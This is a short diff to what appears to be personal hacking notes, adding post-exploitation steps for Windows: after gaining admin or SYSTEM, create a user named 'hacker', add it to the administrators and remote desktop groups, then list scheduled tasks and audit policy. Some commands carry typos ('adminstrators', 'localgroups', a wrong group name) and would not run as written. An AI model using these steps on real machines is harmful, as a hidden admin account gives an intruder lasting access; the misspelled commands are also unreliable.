@@ -415,8 +415,18 @@ pwnt
     
    if your listener did pop then good job 
    
-  
- 
+   if you have admin or local system then create a  new user  that has admin and rdp access 
+   
+   net user hacker /add 
+   net localgroup adminstrators hacker /add
+   net localgroups " remote desktop protocol" hacker /add
+   
+   
+    ( couple command in windows that are important ) 
+    
+    schtasks /query 
+     auditpol /get /category:*
+     
  
  
    
